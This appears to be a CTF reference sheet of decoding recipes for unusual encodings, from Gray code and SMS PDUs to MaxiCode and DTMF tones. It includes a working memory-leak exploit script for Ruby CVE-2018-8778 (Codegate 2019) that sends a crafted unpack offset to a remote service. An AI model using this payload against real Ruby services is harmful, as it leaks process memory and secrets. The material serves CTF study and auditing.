# CTF Misc - Advanced Encodings & Specialized Formats

## Table of Contents
- [Verilog/HDL](#veriloghdl)
- [Gray Code Cyclic Encoding (EHAX 2026)](#gray-code-cyclic-encoding-ehax-2026)
- [Binary Tree Key Encoding](#binary-tree-key-encoding)
- [RTF Custom Tag Data Extraction (VolgaCTF 2013)](#rtf-custom-tag-data-extraction-volgactf-2013)
- [SMS PDU Decoding and Reassembly (RuCTF 2013)](#sms-pdu-decoding-and-reassembly-ructf-2013)
- [Automated Multi-Encoding Sequential Solver (HackIM 2016)](#automated-multi-encoding-sequential-solver-hackim-2016)
- [RFC 4042 UTF-9 Decoding (SECCON 2015)](#rfc-4042-utf-9-decoding-seccon-2015)
- [Pixel Color Binary Encoding (Break In 2016)](#pixel-color-binary-encoding-break-in-2016)
- [Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)](#hexadecimal-sudoku--qr-assembly-bsidessf-2026)
- [TOPKEK Binary Encoding (Hack The Vote 2016)](#topkek-binary-encoding-hack-the-vote-2016)
- [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
- [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
- [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)
- [Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-arrayunpack-buffer-under-read-cve-2018-8778-codegate-2019)
- [Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)](#binary-grid-text-to-qr-image--xor-key-pragyan-ctf-2019)

---

## Verilog/HDL

```python
# Translate Verilog logic to Python
def verilog_module(input_byte):
    wire_a = (input_byte >> 4) & 0xF
    wire_b = input_byte & 0xF
    return wire_a ^ wire_b
```

---

## Gray Code Cyclic Encoding (EHAX 2026)

**Pattern (#808080):** Web interface with a circular wheel (5 concentric circles = 5 bits, 32 positions). Must fill in a valid Gray code sequence where consecutive values differ by exactly one bit.

**Gray code properties:**
- N-bit Gray code has 2^N unique values
- Adjacent values differ by exactly 1 bit (Hamming distance = 1)
- The sequence is **cyclic** — rotating the start position produces another valid sequence
- Standard conversion: `gray = n ^ (n >> 1)`

```python
# Generate N-bit Gray code sequence
def gray_code(n_bits):
    return [i ^ (i >> 1) for i in range(1 << n_bits)]

# 5-bit Gray code: 32 values
seq = gray_code(5)
# [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8, ...]

# Rotate sequence by k positions (cyclic property)
def rotate(seq, k):
    return seq[k:] + seq[:k]

# If decoded output is ROT-N shifted, rotate the Gray code start by N positions
rotated = rotate(seq, 4)  # Shift start by 4
```

**Key insight:** If the decoded output looks correct but shifted (e.g., ROT-4), the Gray code start position needs cyclic rotation by the same offset. The cyclic property guarantees all rotations remain valid Gray codes.

**Wheel mapping:** Each concentric circle = one bit position. Innermost = bit 0, outermost = bit N-1. Read bits at each angular position to build N-bit values.

---

## Binary Tree Key Encoding

**Encoding:** `'0' → j = j*2 + 1`, `'1' → j = j*2 + 2`

**Decoding:**
```python
def decode_path(index):
    path = ""
    while index != 0:
        if index & 1:  # Odd = left ('0')
            path += "0"
            index = (index - 1) // 2
        else:          # Even = right ('1')
            path += "1"
            index = (index - 2) // 2
    return path[::-1]
```

---

## RTF Custom Tag Data Extraction (VolgaCTF 2013)

**Pattern:** Data hidden inside custom RTF control sequences (e.g., `{\*\volgactf412 [DATA]}`). Extract numbered blocks, sort by index, concatenate, and base64-decode.

```python
import re, base64

rtf = open('document.rtf', 'r').read()
# Extract custom tags: {\*\volgactf<N> <DATA>}
blocks = re.findall(r'\{\\\*\\volgactf(\d+)\s+([^}]+)\}', rtf)
blocks.sort(key=lambda x: int(x[0]))  # Sort by numeric index
payload = ''.join(data for _, data in blocks)
flag = base64.b64decode(payload)
```

**Key insight:** RTF files support custom control sequences prefixed with `\*` (ignorable destinations). Malicious or challenge data hides in these ignored fields — standard RTF viewers skip them. Look for non-standard `\*\` tags with `grep -oP '\\\\\\*\\\\[a-z]+\d*' document.rtf`.

---

## SMS PDU Decoding and Reassembly (RuCTF 2013)

**Pattern:** Intercepted hex strings are GSM SMS-SUBMIT PDU (Protocol Data Unit) frames. Concatenated SMS messages require UDH (User Data Header) reassembly by sequence number.

```python
from smspdu import SMS_SUBMIT

# Read PDU hex strings (one per line)
pdus = [line.strip() for line in open('sms_intercept.txt')]

# Sort by concatenation sequence number (bytes 38-40 in hex)
pdus.sort(key=lambda pdu: int(pdu[38:40], 16))

# Extract and concatenate user data
payload = b''
for pdu in pdus:
    sms = SMS_SUBMIT.fromPDU(pdu[2:], '')  # Skip first byte (SMSC length)
    payload += sms.user_data.encode() if isinstance(sms.user_data, str) else sms.user_data

# Payload is often base64 — decode to get embedded file
import base64
with open('output.png', 'wb') as f:
    f.write(base64.b64decode(payload))
```

**Key insight:** SMS PDU format: `0041000B91` prefix identifies SMS-SUBMIT. UDH field at bytes 29-40 contains `05000301XXYY` where XX=total parts, YY=sequence number. Install `smspdu` library (`pip install smspdu`) for automated parsing. Output is often a base64-encoded image — use reverse image search to identify the subject.

---

## Automated Multi-Encoding Sequential Solver (HackIM 2016)

Some challenges require decoding 25+ sequential layers of different encodings. Build an automated decoder:

```python
import base64, zlib, bz2, codecs

def auto_decode(data):
    """Try each encoding and return first successful decode"""
    decoders = [
        ('base64', lambda d: base64.b64decode(d)),
        ('base32', lambda d: base64.b32decode(d)),
        ('base16', lambda d: base64.b16decode(d.upper())),
        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),
        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),
        ('rot13',  lambda d: codecs.decode(d, 'rot_13')),
        ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),
        ('binary', lambda d: bytes(int(d[i:i+8], 2) for i in range(0, len(d.strip()), 8))),
        ('ebcdic', lambda d: d.decode('cp500') if isinstance(d, bytes) else d.encode().decode('cp500')),
    ]

    for name, decoder in decoders:
        try:
            result = decoder(data)
            if result and len(result) > 0:
                return name, result
        except:
            continue
    return None, data

# Chain decoder
data = initial_input
for i in range(50):  # Max layers
    name, data = auto_decode(data)
    if name is None:
        break
    print(f"Layer {i}: {name}")
```

Add Brainfuck detection (presence of `+-<>[].,` characters only) and other esoteric languages as needed.

---

## RFC 4042 UTF-9 Decoding (SECCON 2015)

RFC 4042 (April Fools' RFC) defines UTF-9, a 9-bit encoding for Unicode on systems with 9-bit bytes:

- Each 9-bit "byte" has a continuation bit (MSB): 1 = more bytes follow, 0 = last byte
- Lower 8 bits contain character data
- Multi-byte sequences concatenate the 8-bit portions

```python
def decode_utf9(data_bits):
    """Decode UTF-9 from a bitstring"""
    chars = []
    i = 0
    while i < len(data_bits):
        # Read 9-bit units until continuation bit is 0
        codepoint_bits = ''
        while i + 9 <= len(data_bits):
            continuation = int(data_bits[i])
            codepoint_bits += data_bits[i+1:i+9]
            i += 9
            if continuation == 0:
                break
        if codepoint_bits:
            chars.append(chr(int(codepoint_bits, 2)))
    return ''.join(chars)

# Convert octal/hex input to binary first
binary_string = bin(int(octal_data, 8))[2:]
result = decode_utf9(binary_string)
```

**Key insight:** Look for "4042" or "UTF-9" in challenge descriptions. The April Fools' RFC series (RFC 1149, 2549, 4042) occasionally appears in CTFs.

---

## Pixel Color Binary Encoding (Break In 2016)

Narrow images (7-8 pixels wide) may encode ASCII characters as binary pixel rows:

```python
from PIL import Image

img = Image.open('challenge.png')
pixels = img.load()
width, height = img.size

text = ''
for y in range(height):
    bits = ''
    for x in range(width):
        r, g, b = pixels[x, y][:3]
        # Red pixel = 1, Black pixel = 0 (or white=1, black=0)
        bits += '1' if r > 128 else '0'

    # Pad to 8 bits if needed (7-pixel-wide images)
    if len(bits) == 7:
        bits = '0' + bits  # Prepend leading zero

    text += chr(int(bits, 2))

print(text)
```

**Key insight:** Image width of 7 or 8 pixels strongly suggests binary character encoding (7-bit ASCII or 8-bit). Check both color channels and brightness thresholds.

---

### Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)

**Pattern (hexhaustion):** Flag is encoded across 4 QR codes, each containing one quadrant of a 16x16 hexadecimal Sudoku grid. Solve the Sudoku, read the main diagonal values as hex pairs, convert to ASCII for the flag.

**Solving steps:**

1. **Scan QR codes:** Use `zbarimg` or `pyzbar` to decode all 4 QR codes
2. **Assemble grid:** Each QR contains a quadrant (8x8) with hex values (0-F) and blanks
3. **Solve the 16x16 Sudoku:** Standard Sudoku rules apply with hex digits (0-F) — each row, column, and 4x4 box contains each digit exactly once
4. **Extract flag:** Read diagonal values `grid[i][i]` for i=0..15, pair into bytes, decode as ASCII

```python
from itertools import product

def solve_hex_sudoku(grid):
    """Solve 16x16 Sudoku with hex digits 0-F using backtracking."""
    digits = set(range(16))

    def possible(r, c):
        used = set()
        used.update(grid[r])              # Row
        used.update(grid[i][c] for i in range(16))  # Column
        br, bc = (r // 4) * 4, (c // 4) * 4  # 4x4 box
        for i, j in product(range(br, br+4), range(bc, bc+4)):
            used.update({grid[i][j]})
        used.discard(-1)  # -1 = blank
        return digits - used

    def solve():
        for r, c in product(range(16), range(16)):
            if grid[r][c] == -1:
                for d in possible(r, c):
                    grid[r][c] = d
                    if solve():
                        return True
                    grid[r][c] = -1
                return False
        return True

    solve()
    return grid

# Read diagonal and convert to ASCII
solved = solve_hex_sudoku(grid)
diag_hex = ''.join(format(solved[i][i], 'X') for i in range(16))
flag = bytes.fromhex(diag_hex).decode('ascii')
print(flag)  # e.g., "HYPOAXIS"
```

**Key insight:** The QR codes serve as both a distribution mechanism (splitting the puzzle into 4 pieces) and a data encoding layer. The actual flag encoding is in the Sudoku solution's diagonal values interpreted as hex bytes.

**When to recognize:** Challenge distributes multiple QR codes, mentions "hex", "nibbles", or "16x16 grid". QR content contains hex characters with blanks/underscores.

**References:** BSidesSF 2026 "hexhaustion"

---

### TOPKEK Binary Encoding (Hack The Vote 2016)

Custom binary encoding where `KEK` represents bit 0 and `TOP` represents bit 1. Exclamation marks indicate bit repetition count.

```python
def decode_topkek(encoded):
    """Decode TOPKEK encoding: KEK=0, TOP=1, !=repeat count"""
    tokens = encoded.split()
    bits = ""

    for token in tokens:
        # Count exclamation marks (repeat count = len - 3)
        base = token.replace('!', '')
        repeats = len(token) - len(base)
        if repeats == 0:
            repeats = 1

        if base == "KEK":
            bits += "0" * repeats
        elif base == "TOP":
            bits += "1" * repeats

    # Convert bit string to ASCII
    message = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))

    return message

# Example: "KEK! TOP!! KEK TOP!"
# = "0" + "11" + "0" + "1" = "0110 1..."
```

**Key insight:** TOPKEK is a CTF-specific encoding. Recognize it by the pattern of `TOP`/`KEK` words with varying numbers of `!` suffixes. Each `!` adds one repetition of the corresponding bit value. Decode to binary, then group into 8-bit bytes for ASCII.

---

### MaxiCode 2D Barcode Decoding (CSAW CTF 2016)

MaxiCode is a hexagonal 2D barcode used by UPS, occasionally found in CTF forensics challenges.

```bash
# Identify MaxiCode: distinctive bullseye center pattern
# with hexagonal dot matrix (unlike QR's square modules)

# Decode using zxing library:
# Online: https://zxing.org/w/decode.jspx (upload image)

# Python:
# pip install zxing pyzbar
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
results = decode(Image.open('maxicode.gif'), symbols=[pyzbar.ZBarSymbol.CODE128])
# Note: pyzbar may not support MaxiCode directly
# Use zxing Java library instead:
"

# Java zxing command-line:
java -cp javase.jar:core.jar com.google.zxing.client.j2se.CommandLineRunner maxicode.gif

# Alternative: use online decoders
# - https://products.aspose.app/barcode/recognize
# - https://www.onlinebarcodereader.com/
```

**Key insight:** MaxiCode has a distinctive bullseye center (3 concentric circles) surrounded by a hexagonal grid. Standard QR decoders won't read it. Use zxing (Java) which supports MaxiCode natively, or online barcode decoders. MaxiCode is found in shipping labels, CTF forensics disk images, and embedded in other files.

---

### DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)

**Pattern:** Audio file contains DTMF telephone keypad tones. This is a two-layer encoding: first decode tones to a digit sequence, then decode grouped digits as multi-tap phone keypad input (repeated presses select letters).

**Step 1 — Decode DTMF tones to digits:** Use Audacity's spectrogram view or an online DTMF decoder to identify tone pairs. Pauses/gaps indicate word or group boundaries.

**Step 2 — Decode multi-tap keypad:** Group digits by their key press sequences, then map to letters:

```python
# Multi-tap decode mapping
T9 = {
    '2':'a',  '22':'b',  '222':'c',
    '3':'d',  '33':'e',  '333':'f',
    '4':'g',  '44':'h',  '444':'i',
    '5':'j',  '55':'k',  '555':'l',
    '6':'m',  '66':'n',  '666':'o',
    '7':'p',  '77':'q',  '777':'r', '7777':'s',
    '8':'t',  '88':'u',  '888':'v',
    '9':'w',  '99':'x',  '999':'y', '9999':'z',
}

def decode_multitap(groups):
    """groups: list of strings like ['444', '88', '2', ...]"""
    return ''.join(T9.get(g, '?') for g in groups)
```

**Key insight:** Two-layer encoding — DTMF tones encode digits, then digit sequences use multi-tap phone keypad mapping. Use Audacity's spectrogram to identify pause positions for grouping boundaries. Each same-digit run maps to one letter; a pause separates distinct keypresses on the same digit key.

---

### Music Note Interval Steganography (DefCamp 2017)

**Pattern:** An MP3 is transcribed to musical notes. The flag is encoded as pairs of notes where each note maps to a nibble (4 bits) based on its position (scale degree) in the D major scale. Two nibbles combine to form one byte/character.

**Encoding scheme:**
- D major scale degrees 0–7 map to nibble values 0–7 (3-bit nibble) or 0–15 (4-bit nibble) depending on variant
- Each pair of consecutive notes encodes one character: `(note1 << 4) | note2`
- Known flag prefix/suffix (e.g., `CTF{...}`) at start/end reveals the alphabet mapping

**Recovery approach:**

```python
# Example: D major scale degree → nibble value
# D=0, E=1, F#=2, G=3, A=4, B=5, C#=6, D(octave)=7
scale = {'D': 0, 'E': 1, 'F#': 2, 'G': 3, 'A': 4, 'B': 5, 'C#': 6}

notes = ['A', 'D', 'G', 'E', ...]  # transcribed from audio

chars = []
for i in range(0, len(notes) - 1, 2):
    hi = scale[notes[i]]
    lo = scale[notes[i+1]]
    chars.append(chr((hi << 4) | lo))

print(''.join(chars))
```

**Key insight:** Known plaintext at the start and end (flag format like `CTF{` and `}`) reveals the encoding alphabet — map the known characters back to their note pairs to confirm the scale-degree assignment. Musical scale degree = nibble value; pairs of notes = one byte.

---

## Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)

**Pattern:** A Ruby service calls `String#unpack` (or `Array#pack`) with an attacker-controlled format string. On pre-2.5.1 Ruby, oversized `@N` offsets are compared with signed integers, so a huge N wraps to a negative pointer offset — `unpack` then reads bytes from memory *before* the string's buffer and emits them as integers. Combined with the common bug of putting user input inside the format (e.g. `input.unpack("C*#{input}.length")`), you get an arbitrary memory dump primitive.

```python
# Remote Ruby server evaluates: input.unpack("C*#{input}.length")
# Supplying "@HUGECHUNK1200000" as input builds format "C*@HUGECHUNK1200000.length"
# which unpack parses as: @<offset> C<count> -> read <count> bytes from far offset.
import socket
payload = b'@18446744073708351616C1200000\n1\n'   # 2**64 - 0x1C0000
s = socket.create_connection(('target', 12137))
s.sendall(payload)
data = b''
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

# Each emitted line is one int (byte value from leaked memory)
import string
out = ''.join(
    chr(int(line)) for line in data.decode(errors='ignore').splitlines()
    if line.strip().isdigit() and chr(int(line)) in string.printable
)
import re
print(re.findall(r'FLAG\{[^}]*\}', out))
```

**Key insight:** `String#unpack` is not inherently unsafe — it becomes catastrophic when (a) the format string is attacker-controlled (format-injection pattern, equivalent to `printf` bugs), and (b) the Ruby runtime is pre-2.5.1 (CVE-2018-8778). Huge `@N` offsets leak arbitrary memory. Always audit Ruby services that interpolate user input into `pack`/`unpack`/`sprintf` templates.

**References:** Codegate CTF 2019 Preliminary — mini converter, writeup 13209

---

## Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)

**Pattern:** A text file contains only `0` and `1` characters (often one per line or with random line breaks). Strip whitespace, verify the length is a perfect square (or a known W*H), render as a pixel grid, and decode with `pyzbar`. The QR payload is hex-encoded and must be XORed with a repeating key (commonly `flag` or the challenge name) to reveal the flag.

```python
from PIL import Image, ImageDraw
from pyzbar.pyzbar import decode

raw = open('01qr').read()
bits = ''.join(c for c in raw if c in '01')
# Guess dimensions
import math
n = int(math.isqrt(len(bits)))
assert n * n == len(bits), f'not square: {len(bits)}'

scale = 5
img = Image.new('RGB', (n * scale, n * scale), (255, 255, 255))
d = ImageDraw.Draw(img)
for i in range(n):
    for j in range(n):
        if bits[i * n + j] == '0':           # 0 == black in this challenge
            d.rectangle((j*scale, i*scale,
                         j*scale + scale, i*scale + scale), fill=(0, 0, 0))
img.save('qr.png')

hexstr = decode(img)[0].data.decode()
ct = bytes.fromhex(hexstr)
key = b'flag'
pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
print(pt)
```

**Key insight:** Binary-grid text files are often "render me" puzzles — one pixel per bit, scale by 4-8x so `zbarimg`/`pyzbar` can find the finder patterns. If the decoded bytes are printable-ish but nonsense (e.g. `9YQ8S_VY^`), try short repeating-key XOR with the word `flag`, the CTF name, or `ctf{` — XORing the first 5 bytes of ciphertext with `pctf{` recovers the key immediately.

**References:** Pragyan CTF 2019 — EXORcism, writeup 13835
